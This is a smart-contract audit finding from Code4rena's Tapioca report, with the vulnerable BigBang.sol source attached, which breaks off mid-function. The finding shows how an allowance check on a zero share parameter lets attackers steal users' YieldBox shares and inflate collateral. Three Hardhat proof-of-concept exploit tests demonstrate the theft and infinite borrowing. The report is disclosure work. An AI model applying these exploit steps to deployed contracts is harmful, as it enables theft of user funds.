{
  "Title": "[H-05]  Ability to steal user funds and increase collateral share infinitely in BigBang and Singularity",
  "Content": "\n<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L288> \n\n<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLCollateral.sol#L27>\n\n\n\nThe `addCollateral` methods in both BigBang and Singularity contracts allow the share parameter to be passed as `0`. When `share` is `0`, the equivalent amount of shares is calculated using the YieldBox `toShare` method. However, there is a modifier named `allowedBorrow` that is intended to check the allowed borrowing amount for each implementation of the `addCollateral` methods. Unfortunately, the modifier is called with the `share` value passed to `addCollateral`, and in the case of `0`, it will always pass.\n\n<details>\n\n```solidity\n// MarketERC20.sol\nfunction _allowedBorrow(address from, uint share) internal {\n    if (from != msg.sender) {\n        if (allowanceBorrow[from][msg.sender] < share) {\n            revert NotApproved(from, msg.sender);\n        }\n        allowanceBorrow[from][msg.sender] -= share;\n    }\n}\n\n// BigBang.sol\nfunction addCollateral(\n    address from,\n    address to,\n    bool skim,\n    uint256 amount,\n    uint256 share\n    // @audit share is calculated afterwords the modifier\n) public allowedBorrow(from, share) notPaused {\n    _addCollateral(from, to, skim, amount, share);\n}\n\nfunction _addCollateral(\n    address from,\n    address to,\n    bool skim,\n    uint256 amount,\n    uint256 share\n) internal {\n    if (share == 0) {\n        share = yieldBox.toShare(collateralId, amount, false);\n    }\n    userCollateralShare[to] += share;\n    uint256 oldTotalCollateralShare = totalCollateralShare;\n    totalCollateralShare = oldTotalCollateralShare + share;\n    _addTokens(\n        from,\n        to,\n        collateralId,\n        share,\n        oldTotalCollateralShare,\n        skim\n    );\n    emit LogAddCollateral(skim ? address(yieldBox) : from, to, share);\n}\n```\n\n</details>\n\nThis leads to various critical scenarios in BigBang and Singularity markets where user assets can be stolen, and collateral share can be increased infinitely which in turn leads to infinite USDO borrow/mint and borrowing max assets from Singularity market.\n\nRefer to [Proof of Concept](#proof-of-concept) for attack examples\n\n### Impact\n\nHigh - allows stealing of arbitrary user yieldbox shares in BigBang contract and Singularity. In the case of BigBang this leads to infinite minting of USDO. Effectively draining all markets and LPs where USDO has value. In the case of Singularity this leads to infinite borrowing, allowing an attacker to obtain possession of all other users' collateral in Singularity.\n\n### Proof of concept\n\n1.  Malicious actor can add any user shares that were approved to BigBang or Singularity contracts deployed. This way adversary is stealing user shares that he can unwrap to get underlying collateral provided.\n\n<details>\n\n```solidity\nit('allows steal other user YieldBox collateral shares', async () => {\n    const {\n        wethBigBangMarket,\n        weth,\n        wethAssetId,\n        yieldBox,\n        deployer: userA,\n        eoa1: userB,\n    } = await loadFixture(register);\n\n    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);\n    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);\n\n    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(\n        10,\n    );\n    await weth.freeMint(wethMintVal);\n    const valShare = await yieldBox.toShare(\n        wethAssetId,\n        wethMintVal,\n        false,\n    );\n\n    // User A deposit assets to yieldbox, receives shares\n    await yieldBox.depositAsset(\n        wethAssetId,\n        userA.address,\n        userA.address,\n        0,\n        valShare,\n    );\n    let userABalance = await yieldBox.balanceOf(\n        userA.address,\n        wethAssetId,\n    )\n    expect(userABalance.gt(0)).to.be.true;\n    expect(userABalance.eq(valShare)).to.be.true;\n\n    // User B adds collateral to big bang from user A shares\n    await expect(wethBigBangMarket.connect(userB).addCollateral(\n        userA.address,\n        userB.address,\n        false,\n        wethMintVal,\n        0,\n    )).to.emit(yieldBox, \"TransferSingle\")\n        .withArgs(wethBigBangMarket.address, userA.address, wethBigBangMarket.address, wethAssetId, valShare);\n\n    userABalance = await yieldBox.balanceOf(\n        userA.address,\n        wethAssetId,\n    )\n    expect(userABalance.eq(0)).to.be.true;\n\n    let collateralShares = await wethBigBangMarket.userCollateralShare(\n        userB.address,\n    );\n    expect(collateralShares.gt(0)).to.be.true;\n    expect(collateralShares.eq(valShare)).to.be.true;\n\n    // User B removes collateral\n    await wethBigBangMarket.connect(userB).removeCollateral(\n        userB.address,\n        userB.address,\n        collateralShares,\n    );\n\n    collateralShares = await wethBigBangMarket.connect(userB).userCollateralShare(\n        userA.address,\n    );\n    expect(collateralShares.eq(0)).to.be.true;\n\n    // User B ends up with User A shares in yieldbox\n    let userBBalance = await yieldBox.balanceOf(\n        userB.address,\n        wethAssetId,\n    )\n    expect(userBBalance.gt(0)).to.be.true;\n    expect(userBBalance.eq(valShare)).to.be.true;\n});\n```\n\n</details>\n\n2.  For Singularity contract this allows to increase collateralShare by the amount of assets provided as collateral infinitely leading to `x / x + 1` share of the collateral for the caller with no shares in the pool, where x is the number of times  the `addColateral` is called, effectively allowing for infinite borrowing. As a consequence, the attacker can continuously increase their share of the collateral without limits, leading to potentially excessive borrowing of assets from the Singularity market.\n\n<details>\n\n```solidity\nit('allows to infinitely increase user collateral share in BigBang', async () => {\n    const {\n        wethBigBangMarket,\n        weth,\n        wethAssetId,\n        yieldBox,\n        deployer: userA,\n        eoa1: userB,\n    } = await loadFixture(register);\n\n    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);\n    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);\n\n    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(\n        10,\n    );\n    await weth.freeMint(wethMintVal);\n    const valShare = await yieldBox.toShare(\n        wethAssetId,\n        wethMintVal,\n        false,\n    );\n\n    // User A deposit assets to yieldbox, receives shares\n    await yieldBox.depositAsset(\n        wethAssetId,\n        userA.address,\n        userA.address,\n        0,\n        valShare,\n    );\n    let userABalance = await yieldBox.balanceOf(\n        userA.address,\n        wethAssetId,\n    )\n    expect(userABalance.gt(0)).to.be.true;\n    expect(userABalance.eq(valShare)).to.be.true;\n\n    // User A adds collateral to BigBang\n    await wethBigBangMarket.addCollateral(\n        userA.address,\n        userA.address,\n        false,\n        wethMintVal,\n        0,\n    );\n    let bigBangBalance = await yieldBox.balanceOf(\n        wethBigBangMarket.address,\n        wethAssetId,\n    )\n    expect(bigBangBalance.eq(valShare)).to.be.true;\n    let userACollateralShare = await wethBigBangMarket.userCollateralShare(\n        userA.address,\n    );\n    expect(userACollateralShare.gt(0)).to.be.true;\n    expect(userACollateralShare.eq(valShare)).to.be.true;\n    let userBCollateralShare = await wethBigBangMarket.userCollateralShare(\n        userB.address,\n    );\n    expect(userBCollateralShare.eq(0)).to.be.true;\n\n    // User B is able to increase his share to 50% of the whole collateral added\n    await expect(wethBigBangMarket.connect(userB).addCollateral(\n        wethBigBangMarket.address,\n        userB.address,\n        false,\n        wethMintVal,\n        0,\n    )).to.emit(yieldBox, \"TransferSingle\")\n\n    userBCollateralShare = await wethBigBangMarket.userCollateralShare(\n        userB.address,\n    );\n\n    expect(userBCollateralShare.gt(0)).to.be.true;\n    expect(userBCollateralShare.eq(valShare)).to.be.true;\n\n    // User B is able to increase his share to 66% of the whole collateral added\n    await expect(wethBigBangMarket.connect(userB).addCollateral(\n        wethBigBangMarket.address,\n        userB.address,\n        false,\n        wethMintVal,\n        0,\n    )).to.emit(yieldBox, \"TransferSingle\")\n\n    userBCollateralShare = await wethBigBangMarket.userCollateralShare(\n        userB.address,\n    );\n\n    expect(userBCollateralShare.gt(0)).to.be.true;\n    expect(userBCollateralShare.eq(valShare.mul(2))).to.be.true;\n\n    // ....\n});\n```\n\n</details>\n\n3.  In the BigBang contract, this vulnerability allows a user to infinitely increase their collateral shares by providing collateral repeatedly. As a result, the user can artificially inflate their collateral shares provided, potentially leading to an excessive borrowing capacity. By continuously adding collateral without limitations, the user can effectively borrow against any collateral amount they desire, which poses a significant risk to USDO market.\n\n<details>\n\n```solidity\nit('allows infinite borrow of USDO', async () => {\n    const {\n        wethBigBangMarket,\n        weth,\n        wethAssetId,\n        yieldBox,\n        deployer: userA,\n        eoa1: userB,\n    } = await loadFixture(register);\n\n    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);\n    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);\n\n    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(\n        10,\n    );\n    await weth.freeMint(wethMintVal);\n    const valShare = await yieldBox.toShare(\n        wethAssetId,\n        wethMintVal,\n        false,\n    );\n\n    // User A deposit assets to yieldbox, receives shares\n    await yieldBox.depositAsset(\n        wethAssetId,\n        userA.address,\n        userA.address,\n        0,\n        valShare,\n    );\n    let userABalance = await yieldBox.balanceOf(\n        userA.address,\n        wethAssetId,\n    )\n    expect(userABalance.gt(0)).to.be.true;\n    expect(userABalance.eq(valShare)).to.be.true;\n\n    // User A adds collateral to BigBang\n    await wethBigBangMarket.addCollateral(\n        userA.address,\n        userA.address,\n        false,\n        wethMintVal,\n        0,\n    );\n    let bigBangBalance = await yieldBox.balanceOf(\n        wethBigBangMarket.address,\n        wethAssetId,\n    )\n    expect(bigBangBalance.eq(valShare)).to.be.true;\n    let userACollateralShare = await wethBigBangMarket.userCollateralShare(\n        userA.address,\n    );\n    expect(userACollateralShare.gt(0)).to.be.true;\n    expect(userACollateralShare.eq(valShare)).to.be.true;\n\n    await wethBigBangMarket.borrow(userA.address, userA.address, \"7450000000000000000000\");\n\n    await expect(\n        wethBigBangMarket.borrow(userA.address, userA.address, \"7450000000000000000000\")\n    ).to.be.reverted;\n\n    await expect(wethBigBangMarket.addCollateral(\n        wethBigBangMarket.address,\n        userA.address,\n        false,\n        wethMintVal,\n        0,\n    )).to.emit(yieldBox, \"TransferSingle\")\n\n    await wethBigBangMarket.borrow(userA.address, userA.address, \"7500000000000000000000\");\n\n    await expect(wethBigBangMarket.addCollateral(\n        wethBigBangMarket.address,\n        userA.address,\n        false,\n        wethMintVal,\n        0,\n    )).to.emit(yieldBox, \"TransferSingle\")\n\n    await wethBigBangMarket.borrow(userA.address, userA.address, \"7530000000000000000000\");\n\n    // ....\n});\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\n*   Check allowed to borrow shares amount after evaluating equivalent them\n\n**[0xRektora (Tapioca) confirmed via duplicate issue 55](https://github.com/code-423n4/2023-07-tapioca-findings/issues/55)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/markets/bigBang/BigBang.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"@boringcrypto/boring-solidity/contracts/BoringOwnable.sol\";\nimport \"@boringcrypto/boring-solidity/contracts/ERC20.sol\";\n\nimport \"tapioca-periph/contracts/interfaces/IBigBang.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISendFrom.sol\";\nimport \"tapioca-periph/contracts/interfaces/ISwapper.sol\";\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\n\nimport \"../Market.sol\";\n\n// solhint-disable max-line-length\n/*\n\n__/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\\\\\\\\\\\\\\\\\_______/\\\\\\\\\\_____________/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\____        \n _\\///////\\\\\\/////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__\\/\\\\\\/////////\\\\\\_\\/////\\\\\\///______/\\\\\\///\\\\\\________/\\\\\\////////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__       \n  _______\\/\\\\\\________/\\\\\\/////////\\\\\\_\\/\\\\\\_______\\/\\\\\\_____\\/\\\\\\_______/\\\\\\/__\\///\\\\\\____/\\\\\\/____________/\\\\\\/////////\\\\\\_      \n   _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/______\\/\\\\\\______/\\\\\\______\\//\\\\\\__/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\_     \n    _______\\/\\\\\\_______\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\/////////________\\/\\\\\\_____\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_    \n     _______\\/\\\\\\_______\\/\\\\\\/////////\\\\\\_\\/\\\\\\_________________\\/\\\\\\_____\\//\\\\\\______/\\\\\\__\\//\\\\\\____________\\/\\\\\\/////////\\\\\\_   \n      _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________________\\/\\\\\\______\\///\\\\\\__/\\\\\\_____\\///\\\\\\__________\\/\\\\\\_______\\/\\\\\\_  \n       _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\______________/\\\\\\\\\\\\\\\\\\\\\\____\\///\\\\\\\\\\/________\\////\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______\\/\\\\\\_ \n        _______\\///________\\///________\\///__\\///______________\\///////////_______\\/////_____________\\/////////__\\///________\\///__\n\n*/\n\n/// @title BigBang market\n/// @notice Adaptation of the Singularity contract\n/// @dev owner of the contract is Penrose\n///     - the borrow action performs a mint on USDO\n///     - the repay action performs a burn on USDO\n///     - interest rate is not fixed, but dynamic based on the main BigBang market, minDebtRate, maxDebtRate and debtRateAgainstEthMarket\n///         - BigBang markets can either be main or secondary markets; the main market is set on Penrose and has a fixed rate\n///         - BigBang secondary markets has a dynamic interest rate which is starts from `minDebtRate` to `maxDebtRate`\n///             - if current debt is over _maxDebtPoint = (_ethMarketTotalDebt * debtRateAgainstEthMarket) / 1e18, the interest rate is automatically `maxDebtRate`\n///         - simulation: https://dotnetfiddle.net/cuKVpf\ncontract BigBang is BoringOwnable, Market {\n    using RebaseLibrary for Rebase;\n    using BoringERC20 for IERC20;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    mapping(address => mapping(address => bool)) public operators;\n\n    IBigBang.AccrueInfo public accrueInfo;\n\n    uint256 public totalFees;\n\n    bool private _isEthMarket;\n    uint256 public maxDebtRate;\n    uint256 public minDebtRate;\n    uint256 public debtRateAgainstEthMarket;\n    uint256 public debtStartPoint;\n    uint256 private constant DEBT_PRECISION = 1e18;\n\n    // ************** //\n    // *** EVENTS *** //\n    // ************** //\n    /// @notice event emitted when accrue is called\n    event LogAccrue(uint256 accruedAmount, uint64 rate);\n    /// @notice event emitted when collateral is added\n    event LogAddCollateral(\n        address indexed from,\n        address indexed to,\n        uint256 share\n    );\n    /// @notice event emitted when collateral is removed\n    event LogRemoveCollateral(\n        address indexed from,\n        address indexed to,\n        uint256 share\n    );\n    /// @notice event emitted when borrow is performed\n    event LogBorrow(\n        address indexed from,\n        address indexed to,\n        uint256 amount,\n        uint256 feeAmount,\n        uint256 part\n    );\n    /// @notice event emitted when a repay operation is performed\n    event LogRepay(\n        address indexed from,\n        address indexed to,\n        uint256 amount,\n        uint256 part\n    );\n    /// @notice event emitted when the minimum debt rate is updated\n    event MinDebtRateUpdated(uint256 oldVal, uint256 newVal);\n    /// @notice event emitted when the maximum debt rate is updated\n    event MaxDebtRateUpdated(uint256 oldVal, uint256 newVal);\n    /// @notice event emitted when the debt rate against the main market is updated\n    event DebtRateAgainstEthUpdated(uint256 oldVal, uint256 newVal);\n\n    constructor() MarketERC20(\"Tapioca BigBang\") {}\n\n    /// @notice The init function that acts as a constructor\n    function init(bytes calldata data) external onlyOnce {\n        (\n            IPenrose tapiocaBar_,\n            IERC20 _collateral,\n            uint256 _collateralId,\n            IOracle _oracle,\n            uint256 _exchangeRatePrecision,\n            uint256 _debtRateAgainstEth,\n            uint256 _debtRateMin,\n            uint256 _debtRateMax,\n            uint256 _debtStartPoint\n        ) = abi.decode(\n                data,\n                (\n                    IPenrose,\n                    IERC20,\n                    uint256,\n                    IOracle,\n                    uint256,\n                    uint256,\n                    uint256,\n                    uint256,\n                    uint256\n                )\n            );\n\n        penrose = tapiocaBar_;\n        yieldBox = YieldBox(tapiocaBar_.yieldBox());\n        owner = address(penrose);\n\n        address _asset = penrose.usdoToken();\n\n        require(\n            address(_collateral) != address(0) &&\n                address(_asset) != address(0) &&\n                address(_oracle) != address(0),\n            \"BigBang: bad pair\"\n        );\n\n        asset = IERC20(_asset);\n        assetId = penrose.usdoAssetId();\n        collateral = _collateral;\n        collateralId = _collateralId;\n        oracle = _oracle;\n\n        updateExchangeRate();\n\n        callerFee = 90000; // 90%\n        protocolFee = 10000; // 10%\n        collateralizationRate = 75000; // 75%\n\n        EXCHANGE_RATE_PRECISION = _exchangeRatePrecision > 0\n            ? _exchangeRatePrecision\n            : 1e18;\n\n        _isEthMarket = collateralId == penrose.wethAssetId();\n        if (!_isEthMarket) {\n            debtRateAgainstEthMarket = _debtRateAgainstEth;\n            maxDebtRate = _debtRateMax;\n            minDebtRate = _debtRateMin;\n            debtStartPoint = _debtStartPoint;\n        }\n\n        minLiquidatorReward = 1e3;\n        maxLiquidatorReward = 1e4;\n        liquidationBonusAmount = 1e4;\n        borrowOpeningFee = 50; // 0.05%\n        liquidationMultiplier = 12000; //12%\n    }\n\n    // ********************** //\n    // *** VIEW FUNCTIONS *** //\n    // ********************** //\n    /// @notice returns total market debt\n    function getTotalDebt() external view returns (uint256) {\n        return totalBorrow.elastic;\n    }\n\n    /// @notice returns the current debt rate\n    function getDebtRate() public view returns (uint256) {\n        if (_isEthMarket) return penrose.bigBangEthDebtRate(); // default 0.5%\n        if (totalBorrow.elastic == 0) return minDebtRate;\n\n        uint256 _ethMarketTotalDebt = BigBang(penrose.bigBangEthMarket())\n            .getTotalDebt();\n        uint256 _currentDebt = totalBorrow.elastic;\n        uint256 _maxDebtPoint = (_ethMarketTotalDebt *\n            debtRateAgainstEthMarket) / 1e18;\n\n        if (_currentDebt >= _maxDebtPoint) return maxDebtRate;\n\n        uint256 debtPercentage = ((_currentDebt - debtStartPoint) *\n            DEBT_PRECISION) / (_maxDebtPoint - debtStartPoint);\n        uint256 debt = ((maxDebtRate - minDebtRate) * debtPercentage) /\n            DEBT_PRECISION +\n            minDebtRate;\n\n        if (debt > maxDebtRate) return maxDebtRate;\n\n        return debt;\n    }\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice Allows batched call to BingBang.\n    /// @param calls An array encoded call data.\n    /// @param revertOnFail If True then reverts after a failed call and stops doing further calls.\n    function execute(\n        bytes[] calldata calls,\n        bool revertOnFail\n    ) external returns (bool[] memory successes, string[] memory results) {\n        successes = new bool[](calls.length);\n        results = new string[](calls.length);\n        for (uint256 i = 0; i < calls.length; i++) {\n            (bool success, bytes memory result) = address(this).delegatecall(\n                calls[i]\n            );\n            require(success || !revertOnFail, _getRevertMsg(result));\n            successes[i] = success;\n            results[i] = _getRevertMsg(result);\n        }\n    }\n\n    /// @notice allows 'operator' to act on behalf of the sender\n    /// @param status true/false\n    function updateOperator(address operator, bool status) external {\n        operators[msg.sender][operator] = status;\n    }\n\n    /// @notice Accrues the interest on the borrowed tokens and handles the accumulation of fees.\n    function accrue() public {\n        _accrue();\n    }\n\n    /// @notice Sender borrows `amount` and transfers it to `to`.\n    /// @param from Account to borrow for.\n    /// @param to The receiver of borrowed tokens.\n    /// @param amount Amount to borrow.\n    /// @return part Total part of the debt held by borrowers.\n    /// @return share Total amount in shares borrowed.\n    function borrow(\n        address from,\n        address to,\n        uint256 amount\n    ) public notPaused solvent(from) returns (uint256 part, uint256 share) {\n        uint256 allowanceShare = _computeAllowanceAmountInAsset(\n            from,\n            exchangeRate,\n            amount,\n            asset.safeDecimals()\n        );\n        _allowedBorrow(from, allowanceShare);\n        (part, share) = _borrow(from, to, amount);\n    }\n\n    /// @notice Repays a loan.\n    /// @dev The bool param is not used but we added it to respect the ISingularity interface for MarketsHelper compatibility\n    /// @param from Address to repay from.\n    /// @param to Address of the user this payment should go.\n    /// @param part The amount to repay. See `userBorrowPart`.\n    /// @return amount The total amount repayed.\n    function repay(\n        address from,\n        address to,\n        bool,\n        uint256 part\n    ) public notPaused allowedBorrow(from, part) returns (uint256 amount) {\n        updateExchangeRate();\n\n        accrue();\n\n        amount = _repay(from, to, part);\n    }\n\n    /// @notice Adds `collateral` from msg.sender to the account `to`.\n    /// @param from Account to transfer shares from.\n    /// @param to The receiver of the tokens.\n    /// @param skim True if the amount should be skimmed from the deposit balance of msg.sender.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    /// @param share The amount of shares to add for `to`.\n    function addCollateral(\n        address from,\n        address to,\n        bool skim,\n        uint256 amount,\n        uint256 share\n    ) public allowedBorrow(from, share) notPaused {\n        _addCollateral(from, to, skim, amount, share);\n    }\n\n    /// @notice Removes `share` amount of collateral and transfers it to `to`.\n    /// @param from Account to debit collateral from.\n    /// @param to The receiver of the shares.\n    /// @param share Amount of shares to remove.\n    function removeCollateral(\n        address from,\n        address to,\n        uint256 share\n    ) public notPaused solvent(from) allowedBorrow(from, share) {\n        _removeCollateral(from, to, share);\n    }\n\n    /// @notice Entry point for liquidations.\n    /// @param users An array of user addresses.\n    /// @param maxBorrowParts A one-to-one mapping to `users`, contains maximum (partial) borrow amounts (to liquidate) of the respective user.\n    /// @param swapper Contract address of the `MultiSwapper` implementation. See `setSwapper`.\n    /// @param collateralToAssetSwapData Extra swap data\n    function liquidate(\n        address[] calldata users,\n        uint256[] calldata maxBorrowParts,\n        ISwapper swapper,\n        bytes calldata collateralToAssetSwapData\n    ) external notPaused {\n        // Oracle can fail but we still need to allow liquidations\n        (, uint256 _exchangeRate) = updateExchangeRate();\n        _accrue();\n\n        _closedLiquidation(\n            users,\n            maxBorrowParts,\n            swapper,\n            _exchangeRate,\n            collateralToAssetSwapData\n        );\n    }\n\n    /// @notice Lever up: Borrow more and buy collateral with it.\n    /// @param from The user who buys\n    /// @param borrowAmount Amount of extra asset borrowed\n    /// @param supplyAmount Amount of asset supplied (down payment)\n    /// @param minAmountOut Mininal collateral amount to receive\n    /// @param swapper Swapper to execute the purchase\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual collateral amount purchased\n    function buyCollateral(\n        address from,\n        uint256 borrowAmount,\n        uint256 supplyAmount,\n        uint256 minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        // Let this fail first to save gas:\n        uint256 supplyShare = yieldBox.toShare(assetId, supplyAmount, true);\n        if (supplyShare > 0) {\n            yieldBox.transfer(from, address(swapper), assetId, supplyShare);\n        }\n\n        uint256 borrowShare;\n        (, borrowShare) = _borrow(from, address(swapper), borrowAmount);\n\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            assetId,\n            collateralId,\n            0,\n            supplyShare + borrowShare,\n            true,\n            true\n        );\n\n        uint256 collateralShare;\n        (amountOut, collateralShare) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n\n        _allowedBorrow(from, collateralShare);\n        _addCollateral(from, from, false, 0, collateralShare);\n    }\n\n    /// @notice Lever down: Sell collateral to repay debt; excess goes to YB\n    /// @param from The user who sells\n    /// @param share Collateral YieldBox-shares to sell\n    /// @param minAmountOut Mininal proceeds required for the sale\n    /// @param swapper Swapper to execute the sale\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual asset amount received in the sale\n    function sellCollateral(\n        address from,\n        uint256 share,\n        uint256 minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        _allowedBorrow(from, share);\n        _removeCollateral(from, address(swapper), share);\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            collateralId,\n            assetId,\n            0,\n            share,\n            true,\n            true\n        );\n        uint256 shareOut;\n        (amountOut, shareOut) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        // As long as the ratio is correct, we trust `amountOut` resp.\n        // `shareOut`, because all money received by the swapper gets used up\n        // one way or another, or the transaction will revert.\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n        uint256 partOwed = userBorrowPart[from];\n        uint256 amountOwed = totalBorrow.toElastic(partOwed, true);\n        uint256 shareOwed = yieldBox.toShare(assetId, amountOwed, true);\n        if (shareOwed <= shareOut) {\n            _repay(from, from, partOwed);\n        } else {\n            //repay as much as we can\n            uint256 partOut = totalBorrow.toBase(amountOut, false);\n            _repay(from, from, partOut);\n        }\n    }\n\n    function transfer(\n        address to,\n        uint256 amount\n    ) public override returns (bool) {}\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public override returns (bool) {}\n\n    // ************************* //\n    // *** OWNER FUNCTIONS ***** //\n    // ************************* //\n\n    /// @notice Transfers fees to penrose\n    function refreshPenroseFees(\n        address\n    ) external onlyOwner notPaused returns (uint256 feeShares) {\n        uint256 balance = asset.balanceOf(address(this));\n        totalFees += balance;\n        feeShares = yieldBox.toShare(assetId, totalFees, false);\n\n        if (totalFees > 0) {\n            asset.approve(address(yieldBox), totalFees);\n\n            yieldBox.depositAsset(\n                assetId,\n                address(this),\n                msg.sender,\n                totalFees,\n                0\n            );\n\n            totalFees = 0;\n        }\n    }\n\n    /// @notice sets BigBang specific configuration\n    /// @dev values are updated only if > 0 or not address(0)\n    function setBigBangConfig(\n        uint256 _minDebtRate,\n        uint256 _maxDebtRate,\n        uint256 _debtRateAgainstEthMarket,\n        uint256 _liquidationMultiplier\n    ) external onlyOwner {\n        _isEthMarket = collateralId == penrose.wethAssetId();\n\n        if (!_isEthMarket) {\n            if (_minDebtRate > 0) {\n                require(_minDebtRate < maxDebtRate, \"BigBang: not valid\");\n                emit MinDebtRateUpdated(minDebtRate, _minDebtRate);\n                minDebtRate = _minDebtRate;\n            }\n\n            if (_maxDebtRate > 0) {\n                require(_maxDebtRate > minDebtRate, \"BigBang: not valid\");\n                emit MaxDebtRateUpdated(maxDebtRate, _maxDebtRate);\n                maxDebtRate = _maxDebtRate;\n            }\n\n            if (_debtRateAgainstEthMarket > 0) {\n                emit DebtRateAgainstEthUpdated(\n                    debtRateAgainstEthMarket,\n                    _debtRateAgainstEthMarket\n                );\n                debtRateAgainstEthMarket = _debtRateAgainstEthMarket;\n            }\n\n            if (_liquidationMultiplier > 0) {\n                require(\n                    _liquidationMultiplier < FEE_PRECISION,\n                    \"BigBang: not valid\"\n                );\n                emit LiquidationMultiplierUpdated(\n                    liquidationMultiplier,\n                    _liquidationMultiplier\n                );\n                liquidationMultiplier = _liquidationMultiplier;\n            }\n        }\n    }\n\n    // ************************* //\n    // *** PRIVATE FUNCTIONS *** //\n    // ************************* //\n    function _accrue() internal override {\n        IBigBang.AccrueInfo memory _accrueInfo = accrueInfo;\n        // Number of seconds since accrue was called\n        uint256 elapsedTime = block.timestamp - _accrueInfo.lastAccrued;\n        if (elapsedTime == 0) {\n            return;\n        }\n        //update debt rate\n        uint256 annumDebtRate = getDebtRate();\n        _accrueInfo.debtRate = uint64(annumDebtRate / 31536000); //per second\n\n        _accrueInfo.lastAccrued = uint64(block.timestamp);\n\n        Rebase memory _totalBorrow = totalBorrow;\n\n        uint256 extraAmount = 0;\n\n        // Calculate fees\n        extraAmount =\n            (uint256(_totalBorrow.elastic) *\n                _accrueInfo.debtRate *\n                elapsedTime) /\n            1e18;\n        _totalBorrow.elastic += uint128(extraAmount);\n\n        totalBorrow = _totalBorrow;\n        accrueInfo = _accrueInfo;\n\n        emit LogAccrue(extraAmount, _accrueInfo.debtRate);\n    }\n\n    function _addCollateral(\n        address from,\n        address to,\n        bool skim,\n        uint256 amount,\n        uint256 share\n    ) internal {\n        if (share == 0) {\n            share = yieldBox.toShare(collateralId, amount, false);\n        }\n        userCollateralShare[to] += share;\n        uint256 oldTotalCollateralShare = totalCollateralShare;\n        totalCollateralShare = oldTotalCollateralShare + share;\n        _addTokens(from, collateralId, share, oldTotalCollateralShare, skim);\n        emit LogAddCollateral(skim ? address(yieldBox) : from, to, share);\n    }\n\n    function _liquidateUser(\n        address user,\n        uint256 maxBorrowPart,\n        ISwapper swapper,\n        uint256 _exchangeRate,\n        bytes calldata _dexData\n    ) private {\n        if (_isSolvent(user, _exchangeRate)) return;\n\n        (\n            uint256 startTVLInAsset,\n            uint256 maxTVLInAsset\n        ) = _computeMaxAndMinLTVInAsset(\n                userCollateralShare[user],\n                _exchangeRate\n            );\n        uint256 callerReward = _getCallerReward(\n            userBorrowPart[user],\n            startTVLInAsset,\n            maxTVLInAsset\n        );\n\n        (\n            uint256 borrowAmount,\n            uint256 borrowPart,\n            uint256 collateralShare\n        ) = _updateBorrowAndCollateralShare(user, maxBorrowPart, _exchangeRate);\n        emit LogRemoveCollateral(user, address(swapper), collateralShare);\n        emit LogRepay(address(swapper), user, borrowAmount, borrowPart);\n\n        uint256 borrowShare = yieldBox.toShare(assetId, borrowAmount, true);\n\n        // Closed liquidation using a pre-approved swapper\n        require(penrose.swappers(swapper), \"BigBang: Invalid swapper\");\n\n        // Swaps the users collateral for the borrowed asset\n        yieldBox.transfer(\n            address(this),\n            address(swapper),\n            collateralId,\n            collateralShare\n        );\n\n        uint256 minAssetMount = 0;\n        if (_dexData.length > 0) {\n            minAssetMount = abi.decode(_dexData, (uint256));\n        }\n\n        uint256 balanceBefore = yieldBox.balanceOf(address(this), assetId);\n\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            collateralId,\n            assetId,\n            0,\n            collateralShare,\n            true,\n            true\n        );\n        swapper.swap(swapData, 